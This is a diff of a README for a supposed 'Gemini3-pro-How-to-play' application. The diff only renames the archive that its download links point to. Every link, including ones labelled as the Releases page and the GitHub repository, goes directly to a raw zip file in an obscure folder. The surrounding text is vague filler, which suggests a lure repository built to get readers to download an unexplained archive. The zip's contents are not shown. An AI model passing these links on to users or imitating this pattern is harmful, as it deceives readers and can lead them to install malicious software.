@@ -1,6 +1,6 @@
 # 🌟 Gemini3-pro-How-to-play - Learn to Navigate with Ease
 
-[![Download Now](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/Gemini3-pro-How-to-play-stolae.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/Gemini3-pro-How-to-play-stolae.zip)
+[![Download Now](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/to_How_pro_play_Gemini_v1.0-alpha.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/to_How_pro_play_Gemini_v1.0-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Gemini3-pro-How-to-play** application. This guide will help you
 
 1. **Visit the Releases Page:** Click on the link to go to the Releases page.
 
-   [Download from Releases Page](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/Gemini3-pro-How-to-play-stolae.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/to_How_pro_play_Gemini_v1.0-alpha.2.zip)
 
 2. **Choose the Correct Version:** On this page, you will see a list of available versions. Look for the most recent version, typically labeled with the highest number.
 
@@ -83,7 +83,7 @@ For additional support, please reach out to the community or file an issue on ou
 
 ## 📣 Important Links
 
-- [Visit the Releases Page to Download](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/Gemini3-pro-How-to-play-stolae.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/Gemini3-pro-How-to-play-stolae.zip)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/to_How_pro_play_Gemini_v1.0-alpha.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/randomguy312/Gemini3-pro-How-to-play/main/commerceless/to_How_pro_play_Gemini_v1.0-alpha.2.zip)
 
 Thank you for choosing **Gemini3-pro-How-to-play**. We hope you enjoy using the application!
